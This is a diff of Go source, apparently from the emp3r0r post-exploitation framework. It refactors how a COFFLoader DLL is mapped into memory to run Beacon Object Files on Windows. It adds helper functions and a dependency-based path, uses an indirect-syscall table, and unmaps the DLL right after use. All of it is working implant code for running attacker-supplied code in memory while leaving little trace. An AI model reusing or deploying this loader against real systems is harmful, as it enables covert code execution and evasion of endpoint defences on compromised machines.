@@ -12,53 +12,37 @@ import (
 	"unicode/utf16"
 	"unsafe"
 
+	"github.com/jm33-m0/emp3r0r/core/lib/memdeps"
 	"github.com/jm33-m0/emp3r0r/core/lib/memmod"
 	ntsyscall "github.com/jm33-m0/emp3r0r/core/lib/syscall"
 	"golang.org/x/sys/windows"
 )
 
-// RunWindowsCOFFViaDLL loads the COFFLoader DLL in memory with memmod and runs
-// one BOF through its exported LoadAndRun function. The DLL is unloaded again
-// as soon as the BOF returns; the DLL bytes themselves are expected to stay
-// cached in memfs by the caller so they can be re-loaded on demand.
-func RunWindowsCOFFViaDLL(dllData, payload []byte, entry string, args []CoffArg, token uintptr) (out string, err error) {
-	defer func() {
-		if r := recover(); r != nil {
-			err = fmt.Errorf("RunWindowsCOFFViaDLL panic: %v", r)
-			out = ""
-		}
-	}()
-
+// prepareBOF validates the BOF input, defaults its entry point, initializes
+// the syscall table, and builds the LoadAndRun buffer the DLL expects.
+func prepareBOF(payload []byte, entry string, args []CoffArg) ([]byte, error) {
 	if runtime.GOARCH != "amd64" && runtime.GOARCH != "386" {
-		return "", fmt.Errorf("in-memory DLL COFF loading is not supported on %s", runtime.GOARCH)
-	}
-	if len(dllData) == 0 {
-		return "", fmt.Errorf("empty COFFLoader DLL")
+		return nil, fmt.Errorf("in-memory DLL COFF loading is not supported on %s", runtime.GOARCH)
 	}
 	if len(payload) == 0 {
-		return "", fmt.Errorf("empty COFF payload")
+		return nil, fmt.Errorf("empty COFF payload")
 	}
 	if entry == "" {
 		entry = "go"
 	}
-
-	if err = ensureSyscallTable(); err != nil {
-		return "", fmt.Errorf("initializing syscall table: %w", err)
+	if err := ensureSyscallTable(); err != nil {
+		return nil, fmt.Errorf("initializing syscall table: %w", err)
 	}
-
 	bofArgs, err := packBOFArgs(args)
 	if err != nil {
-		return "", err
+		return nil, err
 	}
+	return buildLoadAndRunBuffer(entry, payload, bofArgs), nil
+}
 
-	buf := buildLoadAndRunBuffer(entry, payload, bofArgs)
-
-	module, err := memmod.LoadLibrary(dllData)
-	if err != nil {
-		return "", fmt.Errorf("loading COFFLoader DLL: %w", err)
-	}
-	defer module.Free()
-
+// runLoadAndRun resolves and invokes the mapped DLL's LoadAndRun export,
+// returning whatever the BOF wrote through the output callback.
+func runLoadAndRun(module *memmod.Module, buf []byte, token uintptr) (string, error) {
 	loadAndRun, err := module.ProcAddressByName("LoadAndRun")
 	if err != nil {
 		return "", fmt.Errorf("resolving LoadAndRun: %w", err)
@@ -90,8 +74,58 @@ func RunWindowsCOFFViaDLL(dllData, payload []byte, entry string, args []CoffArg,
 	if ret := int32(uint32(r0)); ret != 0 {
 		return string(output), fmt.Errorf("LoadAndRun returned %d", ret)
 	}
-
 	return string(output), nil
+}
+
+// RunWindowsCOFFViaDLL maps the caller-supplied DLL image, runs one BOF
+// through its exported LoadAndRun function, and unmaps the DLL before
+// returning. The image is never left resident once the BOF has run.
+func RunWindowsCOFFViaDLL(dllData, payload []byte, entry string, args []CoffArg, token uintptr) (out string, err error) {
+	defer func() {
+		if r := recover(); r != nil {
+			err = fmt.Errorf("RunWindowsCOFFViaDLL panic: %v", r)
+			out = ""
+		}
+	}()
+
+	if len(dllData) == 0 {
+		return "", fmt.Errorf("empty DLL image")
+	}
+	buf, err := prepareBOF(payload, entry, args)
+	if err != nil {
+		return "", err
+	}
+
+	err = memdeps.Run(dllData, func(module *memmod.Module) error {
+		var runErr error
+		out, runErr = runLoadAndRun(module, buf, token)
+		return runErr
+	})
+	return out, err
+}
+
+// RunCOFFDependency resolves the "coffloader" dependency, runs one BOF
+// through its exported LoadAndRun function, and unmaps the dependency before
+// returning. The dependency is never left resident once the BOF has run.
+func RunCOFFDependency(payload []byte, entry string, args []CoffArg, token uintptr) (out string, err error) {
+	defer func() {
+		if r := recover(); r != nil {
+			err = fmt.Errorf("RunCOFFDependency panic: %v", r)
+			out = ""
+		}
+	}()
+
+	buf, err := prepareBOF(payload, entry, args)
+	if err != nil {
+		return "", err
+	}
+
+	err = memdeps.Use("coffloader", func(module *memmod.Module) error {
+		var runErr error
+		out, runErr = runLoadAndRun(module, buf, token)
+		return runErr
+	})
+	return out, err
 }
 
 // ensureSyscallTable initializes the global indirect-syscall table used by
